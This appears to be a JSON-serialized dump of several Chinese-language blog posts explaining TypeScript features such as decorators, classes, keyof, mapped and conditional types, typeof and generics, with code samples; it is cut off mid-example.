装饰器使用@expression这种形式，expression求值后必须为一个函数，它会在运行时被调用，被装饰的声明信息做为参数传入。 装饰器工厂定制一个修饰器如何应用到一个声明上，得写一个装饰器工厂函数，装饰器工厂就是一个简单的函数，它返回一个表达式，以供装饰器在运行时调用 12345function color(value: string) &#123; // 这是一个装饰器工厂 return function (target) &#123; // 这是装饰器 // do something with &quot;target&quot; and &quot;value&quot;... &#125;&#125; 类装饰器应用于类构造函数，可以用来监视，修改或替换类定义。类装饰器不能用在声明文件中(.d.ts)，也不能用在人格化外部上下文中 类装饰器表达式会在运行是被当做函数被调用，类的构造函数作为其唯一的参数。 如果类装饰器返回一个值，它会使用提供的构造函数来替换类的声明。 123456789101112131415161718function logClass(params:string)&#123; return function(target:any)&#123; console.log(target);//类 console.log(params);//传入的参数 target.prototype.apiurl=params; &#125;&#125;@logClass(&quot;http://123.com&quot;)*class HttpClient &#123; constructor()&#123; &#125; gatData()&#123; &#125;&#125;var http:any=new HttpClient(); 重载构造函数： 12345678910111213141516171819202122function logClass&lt;T extends &#123;new(...args:any[]):&#123;&#125;&#125;&gt;(constructor:T)&#123; console.log(constructor); return class extends constructor &#123; apiurl:any=&quot;我是修改后的apiurl&quot;; getData()&#123; this.apiurl=this.apiurl+&#x27;!!&#x27;; console.log(this.apiurl); &#125; &#125;&#125;@logClassclass HttpClient &#123; public apiurl:string| undefined; constructor()&#123; this.apiurl=&#x27;我是构造函数里的apiurl&#x27;; &#125; getData()&#123; console.log(this.apiurl); &#125;&#125;let http:any=new HttpClient();http.getData(); 方法装饰器声明在一个方法的声明之前（紧靠着方法声明），他会被应用到方法的属性描述符上，可以用来监视，修改或者替换方法定义。方法装饰器不能用在声明文件(.d.ts)，重载或者任何外部上下文中 方法装饰器表达式会在运行时当做函数被调用，传入下列3个参数： 1 对静态成员来说是类的构造函数，对于实力成员来说是类的原型对象 2 方法的名字 3 方法的属性描述符 123456789101112131415161718192021222324252627282930313233343536373839function get(params:any)&#123; return function(target:any,methodName:any,desc:any)&#123; console.log(target);//类的原型对象 console.log(methodName)//getData console.log(desc.value) //ƒ getData(...args) &#123; // console.log(args); //console.log.toString(&quot;我是getData里面的方法&quot;); //&#125; //修改方法装饰器，改为可以传入参数 //保存当前方法 let oMethod=desc.value; desc.value=function(...args:any[])&#123; args.map((val)=&gt;&#123; return String(val); &#125;) console.log(this);//类 oMethod.apply(this,args); &#125; &#125;&#125;class HttpClient &#123; url: any | undefined; constructor()&#123; &#125; @get(&#x27;123&#x27;) getData(...args:any[])&#123; console.log(args); console.log.toString(&quot;我是getData里面的方法&quot;) &#125;&#125;let http=new HttpClient();http.getData(&#x27;123&#x27;,456); 属性装饰器声明在一个属性声明之前，属性装饰器不能用纸声明文件中(.d.ts),或者任何外部上下文（比如declare的类）里 属性装饰器表达式会在运行时被当做函数被调用，传入下列2个参数： 1 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象 2 属性的名字 123456789101112131415161718function logProperty(params:any)&#123; return function (target:any,attr:any)&#123; console.log(target);//类的原型对象 console.log(attr);//url target[attr]=params; &#125;&#125;class HttpClient &#123; @logProperty(&#x27;http://123.com&#x27;) url:any | undefined; constructor()&#123; &#125; getData()&#123; console.log(this.url); &#125;&#125;var http=new HttpClient();http.getData(); 参数装饰器参数装饰器_声明在一个参数声明之前（紧靠着参数声明）。 参数装饰器应用于类构造函数或方法声明。 参数装饰器不能用在声明文件（.d.ts），重载或其它外部上下文（比如declare的类）里。 参数装饰器表达式会在运行时当作函数被调用，传入下列3个参数： 对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。 成员的名字。 参数在函数参数列表中的索引 装饰器作用：扩展类的方法和属性 装饰器执行顺序：属性&gt;方法&gt;方法参数&gt;类 多个同样的装饰器，执行顺序由后往前","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"类","slug":"类-1","date":"2022-07-06T11:50:36.000Z","updated":"2022-07-08T12:32:19.177Z","comments":true,"path":"2022/07/06/类-1/","link":"","permalink":"https://coloey.github.io/2022/07/06/%E7%B1%BB-1/","excerpt":"","text":"readonly字段可以添加一个readonly的前缀修改符，会阻止在构造函数之外的赋值 123456789101112class Greeter &#123; readonly name:string=&quot;world&quot;; constructor(otherName?:stirng)&#123; if(otherName!==undefined)&#123; this.name=otherName; &#125; &#125; err()&#123; this.name=&quot;not ok&quot;; // Cannot assign to &#x27;name&#x27; because it is a read-only property. &#125;&#125; 类构造函数可以使用带类型注解的参数，默认值，重载等， 12345678class Point &#123; // Overloads constructor(x: number, y: string); constructor(s: string); constructor(xs: any, y?: any) &#123; // TBD &#125;&#125; 类构造函数与函数签名的区别： 构造函数不能有类型参数 构造函数不能返回类型注解，因为总是返回类实例类型 Getter/Setter123456789class C &#123; _length = 0; get length() &#123; return this._length; &#125; set length(value) &#123; this._length = value; &#125;&#125; 规则： 如果get存在而set不存在，属性自动设置为readonly 如果setter参数的类型没有指定，它会被推断为getter的返回类型 getters和setters必须有相同的成员可见性 Ts4.3后，存取器的读取和设置可以使用不同的类型 12345678910111213141516class Thing &#123; _size=0; //这里返回number类型 get size(): number &#123; return this._size; &#125; //这里允许传入的是string|number|boolean类型 set size(value:string | number | boolean)&#123; let num=Number(value); if(!Number.isFinite(num))&#123; this._size=0; return; &#125; this._size=num; &#125;&#125; 覆写派生类可以覆写一个基类的字段或者属性，可以使用super语法访问基类方法 12345678910111213141516171819class Base &#123; greet() &#123; console.log(&quot;Hello, world!&quot;); &#125;&#125; class Derived extends Base &#123; greet(name?: string) &#123; if (name === undefined) &#123; super.greet(); &#125; else &#123; console.log(`Hello, $&#123;name.toUpperCase()&#125;`); &#125; &#125;&#125; const d = new Derived();d.greet();d.greet(&quot;reader&quot;); 初始化顺序： 基类字段初始化 基类构造函数运行 派生类字段初始化 派生类构造函数运行 这意味着基类构造函数只能看到它自己的name的值，因为此时派生类字段初始化还没有运行 静态类：静态类指的是作为类的静态成员存在于某个类的内部的类 静态类之所以存在时因为这些语言强迫所有数据和函数都要在一个类内部，但这个限制在TypeScript中不存在，所以没有静态类的需要，一个只有一个单独实例的类，在JavaScript/TypeScript中，完全可以使用普通对象替代。 举个例子，我们不需要一个static class语法，因为TypeScript中一个常规对象（或者顶级函数）可以实现一样功能 123456789101112// Unnecessary &quot;static&quot; classclass MyStaticClass &#123; static doSomething() &#123;&#125;&#125; // Preferred (alternative 1)function doSomething() &#123;&#125; // Preferred (alternative 2)const MyHelperObject = &#123; dosomething() &#123;&#125;,&#125;; 泛型类：类和接口一样，也可以写泛型，当使用new实例化一个泛型类，它的类型参数的推断和函数调用是同样的方式 12345678class Box&lt;Type&gt; &#123; contents:Type; constructor(value:Type)&#123; this.contents=value; &#125;&#125;const b=new Box(&quot;hello&quot;);//const b:Box&lt;stirng&gt; 静态成员不允许引用类型参数：1234class Box&lt;Type&gt;&#123; static defaultValue:Type; //Static members cannot reference class type parameters&#125; 运行时只有一个Box.defaultValue属性槽，如果设置Box.defaultValue，就会改变Box.defaultValue,这样是不好的 使用箭头函数保留上下文a.ts 12345678910class MyClass &#123; name = &quot;MyClass&quot;; getName = () =&gt; &#123; return this.name; &#125;;&#125;const c = new MyClass();const g = c.getName;// Prints &quot;MyClass&quot; instead of crashingconsole.log(g()); 转为a.js: 123456789101112131415var MyClass = /** @class */ (function () &#123; function MyClass() &#123; var _this = this; this.name = &quot;MyClass&quot;; this.getName = function () &#123; return _this.name; &#125;; &#125; return MyClass;&#125;());var c = new MyClass();c.getName();var g = c.getName;console.log(g()); 注意： this的值在运行时是正确的，即使TypeScript不检查代码 这会使用更多的内存，因为每一个类实例都会拷贝一遍这个函数 你不能在派生类使用super.getName,因为在原型链中并没有入口可以获取基类方法 this参数在Ts方法或函数定义中，第一个参数且名字为this有特殊含义，该参数会在编译时被抹除，Ts会检查一个有this参数的函数在调用时是否有一个正确的上下文，不用像使用箭头函数一样，我们可以给方法定义添加一个this参数，静态强制方法被正确调用 12345678910class MyClass &#123; name=&quot;MyClass&quot;; getName(this:MyClass)&#123; return this.name; &#125;&#125;const c=new MyClass();c.getName();const g=c.getName;console.log(g());//参数void不能赋值给参数MyClass 注意：和箭头函数相反 Js调用者依然可能在没有意识到它的时候错误使用类方法 每个类一个函数，而不是每个类实例一个函数 基类方法定义依然可以通过super调用 this类型在类中，有一个特殊的名为this的类型，会动态的引用当前类的类型 12345678class Box &#123; contents: string = &quot;&quot;; set(value: string) &#123; // (method) Box.set(value: string): this this.contents = value; return this; &#125;&#125; 这里，Ts推断set的返回类型为this而不是Box 12345678910class ClearableBox extends Box &#123; clear() &#123; this.contents = &quot;&quot;; &#125;&#125; const a = new ClearableBox();const b = a.set(&quot;hello&quot;);// const b: ClearableBox 下面这个例子： 12345678910111213141516class Box &#123; content: string = &quot;&quot;; sameAs(other: this) &#123; return other.content === this.content; &#125;&#125; class DerivedBox extends Box &#123; otherContent: string = &quot;?&quot;;&#125; const base = new Box();const derived = new DerivedBox();derived.sameAs(base);// Argument of type &#x27;Box&#x27; is not assignable to parameter of type &#x27;DerivedBox&#x27;. // Property &#x27;otherContent&#x27; is missing in type &#x27;Box&#x27; but required in type &#x27;DerivedBox&#x27;. other:this不同于other:Box,derived.sameAs方法值接受类置于同一个派生类的实例 基于this的类型保护：在类和接口的方法的返回的位置，使用this is Type,当搭配使用类型收窄，目标对象的类型会被收窄为更具体的Type 例子：对一个特定字段进行懒校验，当hasValue被验证为true,会从类型中移除undefined 123456789101112class Box&lt;T&gt;&#123; value?:T; hasValue():this is &#123;value:T&#125;&#123; return this.value!==undefined; &#125;&#125;const box=new Box();box.value=&quot;Game&quot;;box.value;// (property) Box&lt;unknown&gt;.value?: unknownif(box.hasValue())&#123; box.value;// (property) value: unknown&#125; 总结： 构造函数中,this表示当前实例对象，在方法中，this表示当前调用方法的对象 参考：https://ts.yayujs.com/handbook/Class.html#%E7%B1%BB%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB-relationships-between-classes https://www.typescriptlang.org/docs/handbook/2/classes.html","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"keyof","slug":"keyof","date":"2022-07-06T02:19:50.000Z","updated":"2022-07-06T03:12:08.126Z","comments":true,"path":"2022/07/06/keyof/","link":"","permalink":"https://coloey.github.io/2022/07/06/keyof/","excerpt":"","text":"keyof对一个对象使用keyof操作符，会返回该对象属性名组成的一个字符串或者数字字面量的联合 如果这个类型有一个string或者number的类型的索引签名，keyof直接返回这些类型 123456type Arrayish=&#123;[n:number]:unknown&#125;;type A=keypf Arrayish;//type A=numbertype Mapish=&#123;[k:string]:boolean&#125;;type M=keyof Mapish;//type M=string |number M是stirng|number,这是因为JavaScript对象的属性名会被强制转换为一个字符串，所以obj[0]和obj[“0”]是一样的 数字字面量联合类型 123456789101112131415const NumericObject =&#123; [1]:&quot;1&quot;; [2]:&quot;2&quot;; [3]:&quot;3&quot;;&#125;type result=keyof typeof NumericObject;// typeof NumbericObject 的结果为：// &#123;// 1: string;// 2: string;// 3: string;// &#125;// 所以最终的结果为：// type result = 1 | 2 | 3 注意： 下面例子会报错 1234function useKey&lt;T,K extends keyof T&gt;(o:T,k:K)&#123; var name:string=k; //Type &#x27;string|number|symbol&#x27; is not assignable to type &#x27;stirng&#x27;&#125; 如果确定只使用字符串类型的属性名， 123function useKey&lt;T,K extends Extract&lt;keyof T,string&gt;&gt;(o:T,k:K)&#123; var name:string=k;//OK&#125; 如果要处理所有属性名： 123function useKey&lt;T,K extends keyof T&gt;(o:T,k:K)&#123; var name:string | number |symbol=k;&#125;","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"映射类型","slug":"映射类型","date":"2022-07-05T13:28:04.000Z","updated":"2022-07-05T13:41:11.719Z","comments":true,"path":"2022/07/05/映射类型/","link":"","permalink":"https://coloey.github.io/2022/07/05/%E6%98%A0%E5%B0%84%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"一个类型需要基于另外一个类型，但是又不想拷贝一份，可以考虑用映射类型 映射修饰符：在使用映射类型时，两个额外修饰符:readonly用于设置属性只读，?用于设置属性可选，可以通过前缀-或者+删除或者添加这些修饰符，如果没有写前缀，相当于使用了+前缀 12345678910111213141516171819202122232425262728//删除属性中的只读属性type CreateMutable&lt;Type&gt;=&#123; -readonly [Property in keyof Type]:Type[Property];&#125;type LockedAccount=&#123; readonly id:string; readonly name:string;&#125;type UnlockedAccount=CreateMutable&lt;LockedAccount&gt;;// type UnlockedAccount = &#123;// id: string;// name: string;// &#125;//删除属性中的可选属性type Concrete&lt;Type&gt;=&#123; [Property in keyof Type]-?:Type[Property];&#125;type MaybeUser=&#123; id:string; name?:string; age?:number;&#125;type User=Concrete&lt;MaybeUser&gt;;// type User = &#123;// id: string;// name: string;// age: number;// &#125; as实现键名重新映射123type MappedTypeWithProperties&lt;Type&gt;=&#123; [Properties in keyof Type as NewKeyType]:Type[Properties]&#125; 1234567891011121314151617type Getters&lt;Type&gt; = &#123; [Property in keyof Type as `get$&#123;Capitalize&lt;string &amp; Property&gt;&#125;`]: () =&gt; Type[Property]&#125;; interface Person &#123; name: string; age: number; location: string;&#125; type LazyPerson = Getters&lt;Person&gt;;// type LazyPerson = &#123;// getName: () =&gt; string;// getAge: () =&gt; number;// getLocation: () =&gt; string;// &#125; 参考： https://www.typescriptlang.org/docs/handbook/2/template-literal-types.html","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"条件类型","slug":"条件类型","date":"2022-07-05T11:32:13.000Z","updated":"2022-07-05T12:30:47.775Z","comments":true,"path":"2022/07/05/条件类型/","link":"","permalink":"https://coloey.github.io/2022/07/05/%E6%9D%A1%E4%BB%B6%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"条件类型基于输入的值的类型决定输出的值的类型，条件类型就是用来帮助我们描述输入类型和输出类型之间的关系 12345678910111213interface IdLabel &#123; id: number /* some fields */;&#125;interface NameLabel &#123; name: string /* other fields */;&#125; function createLabel(id: number): IdLabel;function createLabel(name: string): NameLabel;function createLabel(nameOrId: string | number): IdLabel | NameLabel;function createLabel(nameOrId: string | number): IdLabel | NameLabel &#123; throw &quot;unimplemented&quot;;&#125; 把逻辑写在条件类型中可以简化掉函数重载： 12345678910type NameOrId&lt;T extends number|string&gt;=T extends number?IdLabel:NameLabel;function createLabel&lt;T extends number|string&gt;(idOrName:T):NameOrId&lt;T&gt;&#123; throw &quot;unimplemented&quot;;&#125;let a=createLabel(&quot;typescript&quot;);//let a:NameLabellet b=createLabel(2.8);//let b:IdLabellet c=createLabel(Math.radom()?&quot;hello&quot;:42);//let c:NameLabel|IdLabel 条件类型约束1234567891011type MessageOf&lt;T extends &#123;message:unknown&#125; ? T[&quot;message&quot;]:never;interface Email &#123; message:string;&#125;interface Dog &#123; bark():void;&#125;type EmailMessageContents=MessageOf&lt;Email&gt;;//type EmailMessageContents=stringtype DogMessageContents=MessageOf&lt;Dog&gt;;//type DogMessageContents=nerver 在条件类型里推断infer关键词，可以从正在比较的类型中推断类型，然后在true分支里引用该推断结果 1234567type Flatten&lt;T&gt;=T extends any[]?T[number]:T;//number索引用来获取数组元素的类型type Str=Flatten&lt;string[]&gt;;//type Str=stringtype Num=Flatten&lt;number&gt;;//type Num=number;//用infertype Flatten&lt;Type&gt;=Type extends Array&lt;infer Item&gt;?Item:Type 使用infer写一些有用的类型帮助别名，我们可以获取一个函数返回的类型： 12345type GetReturnType&lt;Type&gt;=Type extends (...args:nerver[])=&gt;infer Return ?Return :never;type Num=GetReturnType&lt;()=&gt;number&gt;;//type Num=number;type Str=GetReturnType&lt;(x:string)=&gt;string&gt;;//type Str=string 当从多重调用签名（比如重载函数）中推断类型时，会按照最后的签名进行推断，因为一般这个签名是用来处理所有情况的签名 分发条件类型在泛型中使用条件类型时，如果传入一个联合类型，就会变成分发的。 12type ToArray&lt;Type&gt;=Type extends any?Type[]:nerver; 在ToArray传入一个联合类型，这个条件类型会被应用到联合类型的每个成员 12type StrArrOrNumArr=ToArr&lt;string|number&gt;;//type StrArrOrNumArr=string[]|number[] 先遍历联合类型string|number里的每一个成员，得到ToArray|ToArray,最后结果为string[]|number[] 如果要避免这种行为，用方括号包裹extends关键字的每一部分 1234type ToArrayNonDist&lt;Type&gt;=[Type] extends [any] ? Type[]: nerver;type StrArrOrNumArr=ToArrayNonDist&lt;string|number&gt;;//type StrArrOrNumArr = (string | number)[] 先得到ToArrayNonDist&lt;string|number&gt;结果为(string|number)[] 参考： https://ts.yayujs.com/handbook/ConditionalTypes.html#%E5%88%86%E5%8F%91%E6%9D%A1%E4%BB%B6%E7%B1%BB%E5%9E%8B-distributive-conditional-types https://www.typescriptlang.org/docs/handbook/2/conditional-types.html","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"索引访问类型","slug":"索引访问类型","date":"2022-07-05T08:35:46.000Z","updated":"2022-07-05T08:41:03.769Z","comments":true,"path":"2022/07/05/索引访问类型/","link":"","permalink":"https://coloey.github.io/2022/07/05/%E7%B4%A2%E5%BC%95%E8%AE%BF%E9%97%AE%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"用索引访问类型查找另外一个类型上的特定属性 使用typeof获取数组类型，使用number获取数组元素类型 12345678910111213141516const MyArray=[ &#123; name: &quot;Alice&quot;, age: 15 &#125;, &#123; name: &quot;Bob&quot;, age: 23 &#125;, &#123; name: &quot;Eve&quot;, age: 38 &#125;,];type Person=typeof MyArray;//type Person=&#123;name:string;age:number&#125;[];type Person1=typeof MyArray[number];// type Person = &#123;// name: string;// age: number;// &#125;type Age=typeof MyArray[number][&quot;age&quot;];//type Age=number;type Age2=Person[&quot;age&quot;];//typr Age2=number; 参考： https://ts.yayujs.com/handbook/IndexedAccessTypes.html#%E7%B4%A2%E5%BC%95%E8%AE%BF%E9%97%AE%E7%B1%BB%E5%9E%8B-indexed-access-types https://www.typescriptlang.org/docs/handbook/2/indexed-access-types.html","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"typeof","slug":"typeof","date":"2022-07-05T07:16:56.000Z","updated":"2022-07-05T08:36:03.823Z","comments":true,"path":"2022/07/05/typeof/","link":"","permalink":"https://coloey.github.io/2022/07/05/typeof/","excerpt":"","text":"typeoftypeof 在类型上下文中使用，用于获取一个变量或者属性的类型,只能对标识符和属性使用 12let s=&quot;hello&quot;;let n:typeof s;//let n:string 12let shouldContinue:typeof msgbox(&quot;hello&quot;);//&#x27;,&#x27; expected. 要获取msgbox(“hello”)返回值的类型，正确写： 1ReturnType&lt;typeof msgbox&gt; ReturnType你传入一个函数类型，ReturnType会返回该函数的返回值的类型 12type Predicate=(x:unknown)=&gt;boolean;type K=ReturnType&lt;Predicate&gt;;//type K=boolean 值（values)和类型(types)并不是一种东西，为了获取值f也就是函数f的类型，需要使用typeof,而ReturnType,T必须是一个类型 123456789function f()&#123; return &#123;x:10,y:3&#125;;&#125;type P=ReturnType&lt;f&gt;;// &#x27;f&#x27; refers to a value, but is being used as a type here. Did you mean &#x27;typeof f&#x27;?type P=ReturnType&lt;typeof f&gt; // type P = &#123;// x: number;// y: number;// &#125; 对enum类型使用typeof 在TypeScript中，在具体运行时，enum类型会被编译成对象 1234enum UserResponse &#123; No=0, Yes=1,&#125; 对应编译的JavaScript 12345var UserResponse;(function (UserResponse) &#123; UserResponse[UserResponse[&quot;No&quot;] = 0] = &quot;No&quot;; UserResponse[UserResponse[&quot;Yes&quot;] = 1] = &quot;Yes&quot;;&#125;)(UserResponse || (UserResponse = &#123;&#125;)); 12345678console.log(UserResponse);// [LOG]: &#123;// &quot;0&quot;: &quot;No&quot;,// &quot;1&quot;: &quot;Yes&quot;,// &quot;No&quot;: 0,// &quot;Yes&quot;: 1// &#125; 1234567891011121314type result = typeof UserResponse;// okconst a: result = &#123; &quot;No&quot;: 2, &quot;Yes&quot;: 3&#125;result 类型类似于：// &#123;// &quot;No&quot;: number,// &quot;YES&quot;: number// &#125; 一般搭配keyof用于获取属性名的联合字符串 1type result=keyof typeof UserResponse; 参考： https://ts.yayujs.com/handbook/TypeofTypeOperator.html#%E5%AF%B9-enum-%E4%BD%BF%E7%94%A8-typeof https://www.typescriptlang.org/docs/handbook/2/typeof-types.html","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"泛型","slug":"泛型","date":"2022-07-05T03:09:05.000Z","updated":"2022-07-05T07:16:09.966Z","comments":true,"path":"2022/07/05/泛型/","link":"","permalink":"https://coloey.github.io/2022/07/05/%E6%B3%9B%E5%9E%8B/","excerpt":"","text":"用来创建可复用组件的工具，我们称之为泛型（generics）。利用泛型，我们可以创建一个支持众多类型的组件，这让用户可以使用自己的类型消费（consume）这些组件 泛型类型变量1234function identity&lt;Type&gt;(arg:Type):Type&#123; return arg;&#125;let output=identity&lt;string&gt;(&quot;myString&quot;);//let output:string Type允许我们捕获用户提供的类型，使得我们接下来可以使用这个类型。调用函数里的&lt;&gt;明确设置Type为string作为函数调用的一个参数 或者直接使用类型参数推断 1let output=identity(&quot;myString&quot;) 假如我们要使用arg的.length属性，如果传进的参数不拥有length属性，则会报错，有两种写法： 使用Type类型的数组而不是Type 1234function loggingIdentity&lt;Type&gt;(arg:Type[]):Type[]&#123; console.log(arg.length); return arg;&#125; 泛型函数loggingIdentity接受一个Type类型参数和一个实参arg,实参arg是一个Type类型数组，该函数返回一个Type类型数组，使用类型变量Type,作为我们使用类型的一部分，而不是之前的一整个类型 1234function loggingIdentity&lt;Type&gt;(arg:Array&lt;Type&gt;):Array&lt;Type&gt;&#123; console.log(arg.length); return arg;&#125; 泛型接口泛型函数作为接口的函数 1234567interface GenericIdentityfn&#123; &lt;Type&gt;(arg:Type):Type;&#125;function identity&lt;Type&gt;(arg:Type):Type&#123; return arg;&#125;let myidentity:GenericIdentityfn=identity; 有时，我们会将泛型参数作为整个接口的参数，可以让我们清楚知道传入的是什么参数（GenericIdentityfn而不是GenericIdentityfn），而且接口里的其他成员也可以看到 1234567interface GenericIdentityfn&#123; (arg:Type):Type;&#125;function identity&lt;Type&gt;(arg:Type):Type&#123; return arg;&#125;let myidentity:GenericIdentityfn&lt;number&gt;=identity; 泛型类 类似于泛型接口,下面这个例子，不仅可以使用number类型，也可以使用其他类型，和接口一样，可以把类型参数放在类上，确保类中所有属性使用相同类型 一个类有两部分：静态部分和实例部分，泛型类仅仅对实例部分生效，静态成员不能使用类型参数 123456789class GenericNumber&lt;NumType&gt;&#123; zeroValue:NumType; add:(x:NumType,y:NumType)=&gt;NumType;&#125;let myGenericNumber=new GenericNumber&lt;number&gt;();myGenericNumber.zeroValue=0;myGenericNumber.add = function (x, y) &#123; return x + y;&#125;; 泛型约束在接口中列出约束条件，然后使用接口和extends关键词实现约束 1234567interface Lengthwise &#123; length:number;&#125;function loggingIdentity&lt;Type extends Lengthwise&gt;(arg:Type):Type&#123; console.log(arg.length); return arg;&#125; 使用类型参数约束另一个类型参数要获取一个对象给定属性名的值，我们需要确保我们捕获获取obj上不存在的属性，所以在两个类型之间建立一个约束： 1234567function getProperty&lt;Type,Key extends keyof Type&gt;(obj:Type,key:Key)&#123; return obj[key];&#125;let x=&#123;a:1,b:2,c:3,d:4&#125;;getProperty(x,&#x27;a&#x27;);getProperty(x,&#x27;m&#x27;);// Argument of type &#x27;&quot;m&quot;&#x27; is not assignable to parameter of type &#x27;&quot;a&quot; | &quot;b&quot; | &quot;c&quot; | &quot;d&quot;&#x27;. 在泛型中使用类 在TypeScript,当使用工厂模式创建实例时，有必要通过他们的构造函数推断出类的类型 123function create&lt;Type&gt;(c:&#123;new():Type&#125;):Type&#123; return new c();&#125; 参考： https://www.typescriptlang.org/docs/handbook/2/generics.html https://ts.yayujs.com/handbook/Generics.html#%E6%B3%9B%E5%9E%8B-generics","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://coloey.github.io/categories/TypeScript/"}],"tags":[]},{"title":"对象类型","slug":"对象类型","date":"2022-07-04T09:42:40.000Z","updated":"2022-07-05T07:15:40.943Z","comments":true,"path":"2022/07/04/对象类型/","link":"","permalink":"https://coloey.github.io/2022/07/04/%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"readonly属性在 TypeScript 中，属性可以被标记为 readonly，这不会改变任何运行时的行为，但在类型检查的时候，一个标记为 readonly的属性是不能被写入的。 不过使用 readonly 并不意味着一个值就完全是不变的，亦或者说，内部的内容是不能变的。readonly 仅仅表明属性本身是不能被重新写入的。 TypeScript 在检查两个类型是否兼容的时候，并不会考虑两个类型里的属性是否是 readonly，这就意味着，readonly 的值是可以通过别名修改的。 123456789101112131415161718192021interface Person &#123; name: string; age: number;&#125; interface ReadonlyPerson &#123; readonly name: string; readonly age: number;&#125; let writablePerson: Person = &#123; name: &quot;Person McPersonface&quot;, age: 42,&#125;; // workslet readonlyPerson: ReadonlyPerson = writablePerson; console.log(readonlyPerson.age); // prints &#x27;42&#x27;writablePerson.age++;console.log(readonlyPerson.age); // prints &#x27;43&#x27; 索引签名索引签名用来描述可能的值的类型 12345interface StringArray&#123; [index:number]:string;&#125;const myArray:StringArray=getStringArray();const secondItem=myArray[1]; 我们有了一个具有索引签名的接口StringArray,这个索引签名表示当一个StringArray类型的值使用number类型的值进行索引的时候，会返回一个string类型的值 一个索引签名的属性类型必须是string或者是number 虽然TypeScript同时支持string和number类型，但数字索引的返回类型一定要是字符索引返回类型的子类型，因为当使用一个数字进行索引时，JavaScript实际上把它转成了一个字符串，这意味着使用数字100进行索引跟使用字符串100索引是一样的。 1234567891011interface Animal &#123; name:string&#125;interface Dog extends Animal &#123; breed:string;&#125;interface NotOkay &#123; [x:number]:Animal; [x:string]:Dog; //error TS2413: &#x27;number&#x27; index type &#x27;Animal&#x27; is not assignable to &#x27;string&#x27; index type &#x27;Dog&#x27;.&#125; 属性继承：有时我们需要一个比其他类型更具体的类型。举个例子，假设我们有一个 BasicAddress 类型用来描述在美国邮寄信件和包裹的所需字段。 1234567891011interface BasicAddress &#123; name?: string; street: string; city: string; country: string; postalCode: string;&#125; interface AddressWithUnit extends BasicAddress &#123; unit: string;&#125; 接口也可以继承多个类型： 1234567891011interface Colorful &#123; color:string;&#125;interface Circle &#123; radius:number;&#125;interface ColorfulCircle extends Colorful,Circle&#123;&#125;const cc:ColorfulCircle=&#123; color:&quot;red&quot;, radius:42,&#125; 交叉类型用于合并已经存在的对象类型 1234567interface Colorful &#123; color:string;&#125;interface Circle &#123; radius:number;&#125;type ColorfulCircle=Colorful&amp;Circle; 连结Coloeful和Circle产生了一个新的类型，新类型拥有Colorful和Circle的所有成员 123456789101112function draw(circle:Colorful&amp;Circle)&#123; console.log(`Color was $&#123;circle.color&#125;`); console.log(`Radius was $&#123;circle.radius&#125;`);&#125;// okaydraw(&#123; color: &quot;blue&quot;, radius: 42 &#125;); // oopsdraw(&#123; color: &quot;red&quot;, raidus: 42 &#125;);// Argument of type &#x27;&#123; color: string; raidus: number; &#125;&#x27; is not assignable to parameter of type &#x27;Colorful &amp; Circle&#x27;.// Object literal may only specify known properties, but &#x27;raidus&#x27; does not exist in type &#x27;Colorful &amp; Circle&#x27;. Did you mean to write &#x27;radius&#x27;? 接口继承和交叉类型区别在于冲突怎么处理，这也是选择要使用哪种方式的主要原因 123456789interface Colorful &#123; color:string;&#125;interface ColorfulSub extends Colorful &#123; color:number;&#125;// Interface &#x27;ColorfulSub&#x27; incorrectly extends interface &#x27;Colorful&#x27;.// Types of property &#x27;color&#x27; are incompatible.// Type &#x27;number&#x27; is not assignable to type &#x27;string&#x27;. 使用继承方式，如果重写类型会导致编译错误，但交叉类型不会 123456interface Colorful &#123; color:string;&#125;type ColorfulSub=Colorful&amp;&#123; color:number&#125; 不报错，color属性的类型是nerver,取得的是string和number的交集 类型别名和接口：类型别名不同于接口，可以描述的不止是对象类型，我们也可以用类型别名写一些其他种类的泛型帮助类型 1234567891011type OrNull&lt;Type&gt; = Type | null; type OneOrMany&lt;Type&gt; = Type | Type[]; type OneOrManyOrNull&lt;Type&gt; = OrNull&lt;OneOrMany&lt;Type&gt;&gt;; type OneOrManyOrNull&lt;Type&gt; = OneOrMany&lt;Type&gt; | null type OneOrManyOrNullStrings = OneOrManyOrNull&lt;string&gt;; type OneOrManyOrNullStrings = OneOrMany&lt;string&gt; | null 元组：元组类型是另外一种 Array 类型，当你明确知道数组包含多少个元素，并且每个位置元素的类型都明确知道的时候，就适合使用元组类型 1type StringNumberPair = [string, number]; 元组类型在重度依赖约定的 API 中很有用，因为它会让每个元素的意义都很明显。当我们解构的时候，元组给了我们命名变量的自由度。 元组类型中，可以写一个可选属性，但可选元素必须在最后面，而且会影响类型的length 12345678type Either2dOr3d=[number,number,number?];function setCoordinate(coord:Either2dOr3d)&#123; const [x,y,z]=coord; //const z:number|undefined console.log(`Provided coordinates had $&#123;coord.length&#125; dismensions`); //(property) length:2|3&#125; Tuples可以使用剩余元素语法，但必须是array/tuple类型： 123type StringNumberBooleans=[string,number,...boolean[]];type StringBooleansNumber = [string, ...boolean[], number];type BooleansStringNumber = [...boolean[], string, number]; 有剩余元素的元组不会设置length,因为它只知道在不同位置上的已知元素信息： 123456789const a: StringNumberBooleans = [&quot;hello&quot;, 1];const b: StringNumberBooleans = [&quot;beautiful&quot;, 2, true];const c: StringNumberBooleans = [&quot;world&quot;, 3, true, false, true, false, 